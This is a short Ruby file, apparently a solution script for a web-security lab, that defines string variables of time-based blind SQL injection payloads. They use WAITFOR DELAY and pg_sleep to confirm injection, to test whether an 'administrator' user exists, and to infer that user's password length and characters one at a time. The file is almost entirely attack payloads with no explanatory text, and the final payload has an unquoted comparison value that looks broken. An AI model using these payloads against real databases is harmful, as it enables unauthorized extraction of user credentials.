require_relative '../utils.rb'

delay_sql = "'; IF (1=2) WAITFOR DELAY '0:0:10'--" 
delay_sql = "'; IF (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--" 
delay_sql = "' || pg_sleep(10)--" 
base_sql = "' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--"
username_check_sql = "' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--"
password_length_check_sql = "' || (select case when (username='administrator' AND LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--"
password_char_check_sql = "' || (select case when (username='administrator' AND SUBSTR(password, 1, 1) > m) then pg_sleep(10) else pg_sleep(-1) end from users)--"

